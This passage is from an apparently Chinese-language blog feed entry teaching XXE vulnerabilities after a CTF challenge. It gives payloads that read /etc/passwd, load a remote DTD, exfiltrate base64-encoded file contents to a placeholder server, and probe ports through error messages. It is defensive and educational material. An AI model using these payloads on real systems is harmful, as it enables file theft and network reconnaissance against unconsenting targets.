class="meta">&lt;!ENTITY <span class="meta-keyword">content</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;content;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="通过读取上传文件执行xxe"><a href="#通过读取上传文件执行xxe" class="headerlink" title="通过读取上传文件执行xxe"></a>通过读取上传文件执行xxe</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxx.xxx.xxx.xxx/xxe.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxe.dtd的文件内容为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="利用php伪协议读取任意文件"><a href="#利用php伪协议读取任意文件" class="headerlink" title="利用php伪协议读取任意文件"></a>利用php伪协议读取任意文件</h3><p>用php伪协议读取任意文件，当数据无回显的时候还可以将数据发送到远程服务器进行读取</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=/etc/issue"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxx.xxx.xxx.xxx/xxe.dtd"</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">%dtd;</span></span></span><br><span class="line"><span class="meta"><span class="meta">%file;</span></span></span><br><span class="line"><span class="meta"><span class="meta">]&gt;</span></span></span><br></pre></td></tr></table></figure><p>xxe.dtd的内容为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/?%file;'&gt;"</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></p><h3 id="检测目标ip的端口开放情况"><a href="#检测目标ip的端口开放情况" class="headerlink" title="检测目标ip的端口开放情况"></a>检测目标ip的端口开放情况</h3><p>可以通过返回的错误信息来检测目标IP的端口开放情况<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxx.xxx.xxx.xxx:80/"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这种方式可以探测到目标的80端口，通过返回的“Connection refused”可以知道该80端口是未开放的，若返回的是”HTTP request failed!”，可以知道80端口是开放的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在做unctf时遇到一道web题,是xml的xxe漏洞(Do you like xml),当时没做出来,没反应过来这个知识点,后来经人指点稍
      
    
    </summary>
    
    
      <category term="web学习" scheme="https://www.damyahome.github.io/categories/web%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="XXE漏洞" scheme="https://www.damyahome.github.io/tags/XXE%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
</feed>
